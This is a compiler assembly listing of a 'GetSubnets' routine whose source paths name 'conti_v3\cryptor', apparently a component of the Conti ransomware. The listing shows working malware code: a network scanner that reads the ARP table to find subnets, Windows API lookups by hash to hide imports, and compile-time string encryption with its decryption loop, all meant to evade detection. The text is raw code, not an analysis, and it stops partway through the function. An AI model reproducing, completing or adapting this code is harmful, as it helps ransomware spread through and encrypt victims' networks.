; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?GetSubnets@@YAHPEAUsubnet_list_@@@Z
_TEXT	SEGMENT
$T7 = 32
$T5 = 40
$T8 = 48
$T6 = 56
$T2 = 80
$T4 = 176
mem$1$ = 272
SubnetList$GSCopy$1$ = 280
TableSize$ = 288
dwAddress$10 = 292
bAddres$11 = 296
wszIpAddress$12 = 304
__$ArrayPad$ = 352
SubnetList$ = 416
?GetSubnets@@YAHPEAUsubnet_list_@@@Z PROC		; GetSubnets, COMDAT

; 135  : {

$LN561:
  00000	40 55		 push	 rbp
  00002	56		 push	 rsi
  00003	57		 push	 rdi
  00004	48 8d 6c 24 80	 lea	 rbp, QWORD PTR [rsp-128]
  00009	48 81 ec 80 01
	00 00		 sub	 rsp, 384		; 00000180H
  00010	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00017	48 33 c4	 xor	 rax, rsp
  0001a	48 89 45 60	 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 136  : 	ULONG TableSize = 0;

  0001e	33 f6		 xor	 esi, esi
  00020	48 89 4d 18	 mov	 QWORD PTR SubnetList$GSCopy$1$[rbp-256], rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 692  : 	pFunction = (ULONG(WINAPI*)(PMIB_IPNETTABLE, PULONG, BOOL))getapi::GetProcAddressEx2(NULL, IPHLPAPI_MODULE_ID, 0xeae677e7, 49);//GetProcAddress(hIphlp32, OBFA("GetIpNetTable"));

  00024	41 b8 e7 77 e6
	ea		 mov	 r8d, -353994777		; eae677e7H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 136  : 	ULONG TableSize = 0;

  0002a	89 75 20	 mov	 DWORD PTR TableSize$[rbp-256], esi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 692  : 	pFunction = (ULONG(WINAPI*)(PMIB_IPNETTABLE, PULONG, BOOL))getapi::GetProcAddressEx2(NULL, IPHLPAPI_MODULE_ID, 0xeae677e7, 49);//GetProcAddress(hIphlp32, OBFA("GetIpNetTable"));

  0002d	8d 56 12	 lea	 edx, QWORD PTR [rsi+18]
  00030	44 8d 4e 31	 lea	 r9d, QWORD PTR [rsi+49]
  00034	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 693  : 	return pFunction(IpNetTable, SizePointer, Order);

  00039	45 33 c0	 xor	 r8d, r8d
  0003c	48 8d 55 20	 lea	 rdx, QWORD PTR TableSize$[rbp-256]
  00040	33 c9		 xor	 ecx, ecx
  00042	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 140  : 	if (!TableSize) {

  00044	8b 45 20	 mov	 eax, DWORD PTR TableSize$[rbp-256]
  00047	85 c0		 test	 eax, eax
  00049	0f 85 ff 01 00
	00		 jne	 $LN11@GetSubnets
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  0004f	8d 56 0f	 lea	 edx, QWORD PTR [rsi+15]
  00052	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00058	44 8d 4e 5d	 lea	 r9d, QWORD PTR [rsi+93]
  0005c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  00061	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00063	40 88 74 24 50	 mov	 BYTE PTR $T2[rsp], sil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  00068	8b f8		 mov	 edi, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0006a	c6 44 24 51 31	 mov	 BYTE PTR $T2[rsp+1], 49	; 00000031H
  0006f	c6 44 24 52 24	 mov	 BYTE PTR $T2[rsp+2], 36	; 00000024H
  00074	c6 44 24 53 65	 mov	 BYTE PTR $T2[rsp+3], 101 ; 00000065H
  00079	c6 44 24 54 24	 mov	 BYTE PTR $T2[rsp+4], 36	; 00000024H
  0007e	40 88 74 24 55	 mov	 BYTE PTR $T2[rsp+5], sil
  00083	c6 44 24 56 24	 mov	 BYTE PTR $T2[rsp+6], 36	; 00000024H
  00088	c6 44 24 57 2c	 mov	 BYTE PTR $T2[rsp+7], 44	; 0000002cH
  0008d	c6 44 24 58 24	 mov	 BYTE PTR $T2[rsp+8], 36	; 00000024H
  00092	c6 44 24 59 0a	 mov	 BYTE PTR $T2[rsp+9], 10
  00097	c6 44 24 5a 24	 mov	 BYTE PTR $T2[rsp+10], 36 ; 00000024H
  0009c	c6 44 24 5b 5f	 mov	 BYTE PTR $T2[rsp+11], 95 ; 0000005fH
  000a1	c6 44 24 5c 24	 mov	 BYTE PTR $T2[rsp+12], 36 ; 00000024H
  000a6	c6 44 24 5d 65	 mov	 BYTE PTR $T2[rsp+13], 101 ; 00000065H
  000ab	c6 44 24 5e 24	 mov	 BYTE PTR $T2[rsp+14], 36 ; 00000024H
  000b0	40 88 74 24 5f	 mov	 BYTE PTR $T2[rsp+15], sil
  000b5	c6 44 24 60 24	 mov	 BYTE PTR $T2[rsp+16], 36 ; 00000024H
  000ba	c6 44 24 61 50	 mov	 BYTE PTR $T2[rsp+17], 80 ; 00000050H
  000bf	c6 44 24 62 24	 mov	 BYTE PTR $T2[rsp+18], 36 ; 00000024H
  000c4	c6 44 24 63 6f	 mov	 BYTE PTR $T2[rsp+19], 111 ; 0000006fH
  000c9	c6 44 24 64 24	 mov	 BYTE PTR $T2[rsp+20], 36 ; 00000024H
  000ce	c6 44 24 65 2d	 mov	 BYTE PTR $T2[rsp+21], 45 ; 0000002dH
  000d3	c6 44 24 66 24	 mov	 BYTE PTR $T2[rsp+22], 36 ; 00000024H
  000d8	c6 44 24 67 14	 mov	 BYTE PTR $T2[rsp+23], 20
  000dd	c6 44 24 68 24	 mov	 BYTE PTR $T2[rsp+24], 36 ; 00000024H
  000e2	c6 44 24 69 65	 mov	 BYTE PTR $T2[rsp+25], 101 ; 00000065H
  000e7	c6 44 24 6a 24	 mov	 BYTE PTR $T2[rsp+26], 36 ; 00000024H
  000ec	c6 44 24 6b 53	 mov	 BYTE PTR $T2[rsp+27], 83 ; 00000053H
  000f1	c6 44 24 6c 24	 mov	 BYTE PTR $T2[rsp+28], 36 ; 00000024H
  000f6	c6 44 24 6d 23	 mov	 BYTE PTR $T2[rsp+29], 35 ; 00000023H
  000fb	c6 44 24 6e 24	 mov	 BYTE PTR $T2[rsp+30], 36 ; 00000024H
  00100	c6 44 24 6f 6f	 mov	 BYTE PTR $T2[rsp+31], 111 ; 0000006fH
  00105	c6 44 24 70 24	 mov	 BYTE PTR $T2[rsp+32], 36 ; 00000024H
  0010a	c6 44 24 71 5b	 mov	 BYTE PTR $T2[rsp+33], 91 ; 0000005bH
  0010f	c6 44 24 72 24	 mov	 BYTE PTR $T2[rsp+34], 36 ; 00000024H
  00114	c6 44 24 73 14	 mov	 BYTE PTR $T2[rsp+35], 20
  00119	c6 44 24 74 24	 mov	 BYTE PTR $T2[rsp+36], 36 ; 00000024H
  0011e	c6 44 24 75 42	 mov	 BYTE PTR $T2[rsp+37], 66 ; 00000042H
  00123	c6 44 24 76 24	 mov	 BYTE PTR $T2[rsp+38], 36 ; 00000024H
  00128	c6 44 24 77 30	 mov	 BYTE PTR $T2[rsp+39], 48 ; 00000030H
  0012d	c6 44 24 78 24	 mov	 BYTE PTR $T2[rsp+40], 36 ; 00000024H
  00132	c6 44 24 79 53	 mov	 BYTE PTR $T2[rsp+41], 83 ; 00000053H
  00137	c6 44 24 7a 24	 mov	 BYTE PTR $T2[rsp+42], 36 ; 00000024H
  0013c	c6 44 24 7b 31	 mov	 BYTE PTR $T2[rsp+43], 49 ; 00000031H
  00141	c6 44 24 7c 24	 mov	 BYTE PTR $T2[rsp+44], 36 ; 00000024H
  00146	c6 44 24 7d 65	 mov	 BYTE PTR $T2[rsp+45], 101 ; 00000065H
  0014b	c6 44 24 7e 24	 mov	 BYTE PTR $T2[rsp+46], 36 ; 00000024H
  00150	40 88 74 24 7f	 mov	 BYTE PTR $T2[rsp+47], sil
  00155	c6 45 80 24	 mov	 BYTE PTR $T2[rbp-208], 36 ; 00000024H
  00159	c6 45 81 64	 mov	 BYTE PTR $T2[rbp-207], 100 ; 00000064H
  0015d	c6 45 82 24	 mov	 BYTE PTR $T2[rbp-206], 36 ; 00000024H
  00161	c6 45 83 6f	 mov	 BYTE PTR $T2[rbp-205], 111 ; 0000006fH
  00165	c6 45 84 24	 mov	 BYTE PTR $T2[rbp-204], 36 ; 00000024H
  00169	c6 45 85 42	 mov	 BYTE PTR $T2[rbp-203], 66 ; 00000042H
  0016d	c6 45 86 24	 mov	 BYTE PTR $T2[rbp-202], 36 ; 00000024H
  00171	40 88 75 87	 mov	 BYTE PTR $T2[rbp-201], sil
  00175	c6 45 88 24	 mov	 BYTE PTR $T2[rbp-200], 36 ; 00000024H
  00179	c6 45 89 36	 mov	 BYTE PTR $T2[rbp-199], 54 ; 00000036H
  0017d	c6 45 8a 24	 mov	 BYTE PTR $T2[rbp-198], 36 ; 00000024H
  00181	c6 45 8b 05	 mov	 BYTE PTR $T2[rbp-197], 5
  00185	c6 45 8c 24	 mov	 BYTE PTR $T2[rbp-196], 36 ; 00000024H
  00189	c6 45 8d 05	 mov	 BYTE PTR $T2[rbp-195], 5
  0018d	c6 45 8e 24	 mov	 BYTE PTR $T2[rbp-194], 36 ; 00000024H
  00191	c6 45 8f 4c	 mov	 BYTE PTR $T2[rbp-193], 76 ; 0000004cH
  00195	c6 45 90 24	 mov	 BYTE PTR $T2[rbp-192], 36 ; 00000024H
  00199	c6 45 91 05	 mov	 BYTE PTR $T2[rbp-191], 5
  0019d	c6 45 92 24	 mov	 BYTE PTR $T2[rbp-190], 36 ; 00000024H
  001a1	c6 45 93 53	 mov	 BYTE PTR $T2[rbp-189], 83 ; 00000053H
  001a5	c6 45 94 24	 mov	 BYTE PTR $T2[rbp-188], 36 ; 00000024H
  001a9	c6 45 95 4a	 mov	 BYTE PTR $T2[rbp-187], 74 ; 0000004aH
  001ad	c6 45 96 24	 mov	 BYTE PTR $T2[rbp-186], 36 ; 00000024H
  001b1	c6 45 97 53	 mov	 BYTE PTR $T2[rbp-185], 83 ; 00000053H
  001b5	c6 45 98 24	 mov	 BYTE PTR $T2[rbp-184], 36 ; 00000024H
  001b9	c6 45 99 07	 mov	 BYTE PTR $T2[rbp-183], 7
  001bd	c6 45 9a 24	 mov	 BYTE PTR $T2[rbp-182], 36 ; 00000024H
  001c1	c6 45 9b 14	 mov	 BYTE PTR $T2[rbp-181], 20
  001c5	c6 45 9c 24	 mov	 BYTE PTR $T2[rbp-180], 36 ; 00000024H
  001c9	c6 45 9d 3d	 mov	 BYTE PTR $T2[rbp-179], 61 ; 0000003dH
  001cd	c6 45 9e 24	 mov	 BYTE PTR $T2[rbp-178], 36 ; 00000024H
  001d1	c6 45 9f 24	 mov	 BYTE PTR $T2[rbp-177], 36 ; 00000024H
  001d5	c6 45 a0 24	 mov	 BYTE PTR $T2[rbp-176], 36 ; 00000024H
  001d9	0f b6 44 24 51	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  001de	0f b6 44 24 50	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  001e3	84 c0		 test	 al, al
  001e5	75 54		 jne	 SHORT $LN306@GetSubnets
  001e7	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL307@GetSubnets:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001f0	0f b6 4c 34 51	 movzx	 ecx, BYTE PTR $T2[rsp+rsi+1]

; 40   :     return (a % n + n) % n;

  001f5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001fa	83 e9 24	 sub	 ecx, 36			; 00000024H
  001fd	6b c9 19	 imul	 ecx, ecx, 25

; 40   :     return (a % n + n) % n;

  00200	f7 e9		 imul	 ecx
  00202	03 d1		 add	 edx, ecx
  00204	c1 fa 06	 sar	 edx, 6
  00207	8b c2		 mov	 eax, edx
  00209	c1 e8 1f	 shr	 eax, 31
  0020c	03 d0		 add	 edx, eax
  0020e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00211	2b c8		 sub	 ecx, eax
  00213	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00218	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0021b	f7 e9		 imul	 ecx
  0021d	03 d1		 add	 edx, ecx
  0021f	c1 fa 06	 sar	 edx, 6
  00222	8b c2		 mov	 eax, edx
  00224	c1 e8 1f	 shr	 eax, 31
  00227	03 d0		 add	 edx, eax
  00229	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0022c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0022e	88 4c 34 51	 mov	 BYTE PTR $T2[rsp+rsi+1], cl
  00232	48 ff c6	 inc	 rsi
  00235	48 83 fe 50	 cmp	 rsi, 80			; 00000050H
  00239	72 b5		 jb	 SHORT $LL307@GetSubnets
$LN306@GetSubnets:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 142  : 		logs::Write(OBFW(L"GetIpNetTable fails. GetLastError = %lu"), pGetLastError());

  0023b	8b d7		 mov	 edx, edi
  0023d	48 8d 4c 24 51	 lea	 rcx, QWORD PTR $T2[rsp+1]
  00242	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 143  : 		return FALSE;

  00247	33 c0		 xor	 eax, eax
  00249	e9 f1 05 00 00	 jmp	 $LN1@GetSubnets
$LN11@GetSubnets:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  0024e	48 8b c8	 mov	 rcx, rax
  00251	48 89 9c 24 a8
	01 00 00	 mov	 QWORD PTR [rsp+424], rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 147  : 	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);

  00259	48 8b f8	 mov	 rdi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  0025c	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  00261	4c 8b c7	 mov	 r8, rdi
  00264	48 89 45 10	 mov	 QWORD PTR mem$1$[rbp-256], rax
  00268	33 d2		 xor	 edx, edx
  0026a	48 8b c8	 mov	 rcx, rax
  0026d	48 8b d8	 mov	 rbx, rax
  00270	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 148  : 	if (!IpNetTable) {

  00275	48 85 db	 test	 rbx, rbx
  00278	0f 84 f0 01 00
	00		 je	 $LN559@GetSubnets
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 692  : 	pFunction = (ULONG(WINAPI*)(PMIB_IPNETTABLE, PULONG, BOOL))getapi::GetProcAddressEx2(NULL, IPHLPAPI_MODULE_ID, 0xeae677e7, 49);//GetProcAddress(hIphlp32, OBFA("GetIpNetTable"));

  0027e	ba 12 00 00 00	 mov	 edx, 18
  00283	41 b8 e7 77 e6
	ea		 mov	 r8d, -353994777		; eae677e7H
  00289	44 8d 4a 1f	 lea	 r9d, QWORD PTR [rdx+31]
  0028d	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 693  : 	return pFunction(IpNetTable, SizePointer, Order);

  00292	45 33 c0	 xor	 r8d, r8d
  00295	48 8d 55 20	 lea	 rdx, QWORD PTR TableSize$[rbp-256]
  00299	48 8b cb	 mov	 rcx, rbx
  0029c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 153  : 	if (Result != ERROR_SUCCESS) {

  0029e	85 c0		 test	 eax, eax
  002a0	0f 84 cf 01 00
	00		 je	 $LN13@GetSubnets
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  002a6	ba 0f 00 00 00	 mov	 edx, 15
  002ab	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  002b1	44 8d 4a 4e	 lea	 r9d, QWORD PTR [rdx+78]
  002b5	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  002ba	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  002bc	40 88 75 b0	 mov	 BYTE PTR $T4[rbp-256], sil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  002c0	8b f8		 mov	 edi, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  002c2	c6 45 b1 4b	 mov	 BYTE PTR $T4[rbp-255], 75 ; 0000004bH
  002c6	c6 45 b2 65	 mov	 BYTE PTR $T4[rbp-254], 101 ; 00000065H
  002ca	c6 45 b3 62	 mov	 BYTE PTR $T4[rbp-253], 98 ; 00000062H
  002ce	c6 45 b4 65	 mov	 BYTE PTR $T4[rbp-252], 101 ; 00000065H
  002d2	c6 45 b5 2e	 mov	 BYTE PTR $T4[rbp-251], 46 ; 0000002eH
  002d6	c6 45 b6 65	 mov	 BYTE PTR $T4[rbp-250], 101 ; 00000065H
  002da	c6 45 b7 55	 mov	 BYTE PTR $T4[rbp-249], 85 ; 00000055H
  002de	c6 45 b8 65	 mov	 BYTE PTR $T4[rbp-248], 101 ; 00000065H
  002e2	c6 45 b9 1a	 mov	 BYTE PTR $T4[rbp-247], 26
  002e6	c6 45 ba 65	 mov	 BYTE PTR $T4[rbp-246], 101 ; 00000065H
  002ea	c6 45 bb 6e	 mov	 BYTE PTR $T4[rbp-245], 110 ; 0000006eH
  002ee	c6 45 bc 65	 mov	 BYTE PTR $T4[rbp-244], 101 ; 00000065H
  002f2	c6 45 bd 62	 mov	 BYTE PTR $T4[rbp-243], 98 ; 00000062H
  002f6	c6 45 be 65	 mov	 BYTE PTR $T4[rbp-242], 101 ; 00000065H
  002fa	c6 45 bf 2e	 mov	 BYTE PTR $T4[rbp-241], 46 ; 0000002eH
  002fe	c6 45 c0 65	 mov	 BYTE PTR $T4[rbp-240], 101 ; 00000065H
  00302	c6 45 c1 0d	 mov	 BYTE PTR $T4[rbp-239], 13
  00306	c6 45 c2 65	 mov	 BYTE PTR $T4[rbp-238], 101 ; 00000065H
  0030a	c6 45 c3 4e	 mov	 BYTE PTR $T4[rbp-237], 78 ; 0000004eH
  0030e	c6 45 c4 65	 mov	 BYTE PTR $T4[rbp-236], 101 ; 00000065H
  00312	c6 45 c5 53	 mov	 BYTE PTR $T4[rbp-235], 83 ; 00000053H
  00316	c6 45 c6 65	 mov	 BYTE PTR $T4[rbp-234], 101 ; 00000065H
  0031a	c6 45 c7 06	 mov	 BYTE PTR $T4[rbp-233], 6
  0031e	c6 45 c8 65	 mov	 BYTE PTR $T4[rbp-232], 101 ; 00000065H
  00322	c6 45 c9 62	 mov	 BYTE PTR $T4[rbp-231], 98 ; 00000062H
  00326	c6 45 ca 65	 mov	 BYTE PTR $T4[rbp-230], 101 ; 00000065H
  0032a	c6 45 cb 07	 mov	 BYTE PTR $T4[rbp-229], 7
  0032e	c6 45 cc 65	 mov	 BYTE PTR $T4[rbp-228], 101 ; 00000065H
  00332	c6 45 cd 67	 mov	 BYTE PTR $T4[rbp-227], 103 ; 00000067H
  00336	c6 45 ce 65	 mov	 BYTE PTR $T4[rbp-226], 101 ; 00000065H
  0033a	c6 45 cf 4e	 mov	 BYTE PTR $T4[rbp-225], 78 ; 0000004eH
  0033e	c6 45 d0 65	 mov	 BYTE PTR $T4[rbp-224], 101 ; 00000065H
  00342	c6 45 d1 76	 mov	 BYTE PTR $T4[rbp-223], 118 ; 00000076H
  00346	c6 45 d2 65	 mov	 BYTE PTR $T4[rbp-222], 101 ; 00000065H
  0034a	c6 45 d3 06	 mov	 BYTE PTR $T4[rbp-221], 6
  0034e	c6 45 d4 65	 mov	 BYTE PTR $T4[rbp-220], 101 ; 00000065H
  00352	c6 45 d5 29	 mov	 BYTE PTR $T4[rbp-219], 41 ; 00000029H
  00356	c6 45 d6 65	 mov	 BYTE PTR $T4[rbp-218], 101 ; 00000065H
  0035a	c6 45 d7 4d	 mov	 BYTE PTR $T4[rbp-217], 77 ; 0000004dH
  0035e	c6 45 d8 65	 mov	 BYTE PTR $T4[rbp-216], 101 ; 00000065H
  00362	c6 45 d9 07	 mov	 BYTE PTR $T4[rbp-215], 7
  00366	c6 45 da 65	 mov	 BYTE PTR $T4[rbp-214], 101 ; 00000065H
  0036a	c6 45 db 4b	 mov	 BYTE PTR $T4[rbp-213], 75 ; 0000004bH
  0036e	c6 45 dc 65	 mov	 BYTE PTR $T4[rbp-212], 101 ; 00000065H
  00372	c6 45 dd 62	 mov	 BYTE PTR $T4[rbp-211], 98 ; 00000062H
  00376	c6 45 de 65	 mov	 BYTE PTR $T4[rbp-210], 101 ; 00000065H
  0037a	c6 45 df 2e	 mov	 BYTE PTR $T4[rbp-209], 46 ; 0000002eH
  0037e	c6 45 e0 65	 mov	 BYTE PTR $T4[rbp-208], 101 ; 00000065H
  00382	c6 45 e1 64	 mov	 BYTE PTR $T4[rbp-207], 100 ; 00000064H
  00386	c6 45 e2 65	 mov	 BYTE PTR $T4[rbp-206], 101 ; 00000065H
  0038a	c6 45 e3 4e	 mov	 BYTE PTR $T4[rbp-205], 78 ; 0000004eH
  0038e	c6 45 e4 65	 mov	 BYTE PTR $T4[rbp-204], 101 ; 00000065H
  00392	c6 45 e5 29	 mov	 BYTE PTR $T4[rbp-203], 41 ; 00000029H
  00396	c6 45 e6 65	 mov	 BYTE PTR $T4[rbp-202], 101 ; 00000065H
  0039a	c6 45 e7 2e	 mov	 BYTE PTR $T4[rbp-201], 46 ; 0000002eH
  0039e	c6 45 e8 65	 mov	 BYTE PTR $T4[rbp-200], 101 ; 00000065H
  003a2	c6 45 e9 41	 mov	 BYTE PTR $T4[rbp-199], 65 ; 00000041H
  003a6	c6 45 ea 65	 mov	 BYTE PTR $T4[rbp-198], 101 ; 00000065H
  003aa	c6 45 eb 24	 mov	 BYTE PTR $T4[rbp-197], 36 ; 00000024H
  003ae	c6 45 ec 65	 mov	 BYTE PTR $T4[rbp-196], 101 ; 00000065H
  003b2	c6 45 ed 24	 mov	 BYTE PTR $T4[rbp-195], 36 ; 00000024H
  003b6	c6 45 ee 65	 mov	 BYTE PTR $T4[rbp-194], 101 ; 00000065H
  003ba	c6 45 ef 15	 mov	 BYTE PTR $T4[rbp-193], 21
  003be	c6 45 f0 65	 mov	 BYTE PTR $T4[rbp-192], 101 ; 00000065H
  003c2	c6 45 f1 24	 mov	 BYTE PTR $T4[rbp-191], 36 ; 00000024H
  003c6	c6 45 f2 65	 mov	 BYTE PTR $T4[rbp-190], 101 ; 00000065H
  003ca	c6 45 f3 07	 mov	 BYTE PTR $T4[rbp-189], 7
  003ce	c6 45 f4 65	 mov	 BYTE PTR $T4[rbp-188], 101 ; 00000065H
  003d2	c6 45 f5 19	 mov	 BYTE PTR $T4[rbp-187], 25
  003d6	c6 45 f6 65	 mov	 BYTE PTR $T4[rbp-186], 101 ; 00000065H
  003da	c6 45 f7 07	 mov	 BYTE PTR $T4[rbp-185], 7
  003de	c6 45 f8 65	 mov	 BYTE PTR $T4[rbp-184], 101 ; 00000065H
  003e2	c6 45 f9 20	 mov	 BYTE PTR $T4[rbp-183], 32 ; 00000020H
  003e6	c6 45 fa 65	 mov	 BYTE PTR $T4[rbp-182], 101 ; 00000065H
  003ea	c6 45 fb 06	 mov	 BYTE PTR $T4[rbp-181], 6
  003ee	c6 45 fc 65	 mov	 BYTE PTR $T4[rbp-180], 101 ; 00000065H
  003f2	c6 45 fd 33	 mov	 BYTE PTR $T4[rbp-179], 51 ; 00000033H
  003f6	c6 45 fe 65	 mov	 BYTE PTR $T4[rbp-178], 101 ; 00000065H
  003fa	c6 45 ff 65	 mov	 BYTE PTR $T4[rbp-177], 101 ; 00000065H
  003fe	c6 45 00 65	 mov	 BYTE PTR $T4[rbp-176], 101 ; 00000065H
